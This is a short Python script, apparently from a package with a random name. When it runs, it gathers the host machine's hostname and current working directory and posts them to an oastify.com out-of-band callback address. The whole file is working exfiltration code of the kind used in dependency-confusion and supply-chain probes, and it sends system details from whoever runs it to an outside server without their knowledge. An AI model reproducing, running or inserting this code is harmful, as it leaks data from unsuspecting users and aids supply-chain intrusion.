import os
import requests
import socket

PACKAGE_NAME = "j5gnpfweguiwerbngpiutbgn0iutb0pfwbdfsfef"
HOSTNAME = socket.gethostname()
CURRENT_PATH = os.getcwd()

url = "https://3gkkr6u2z1a9rinocp0ue4tw1n7ev4jt.oastify.com"

data = {
    "package_name": PACKAGE_NAME,
    "hostname": HOSTNAME,
    "current_path": CURRENT_PATH
}

response = requests.post(url, data=data)
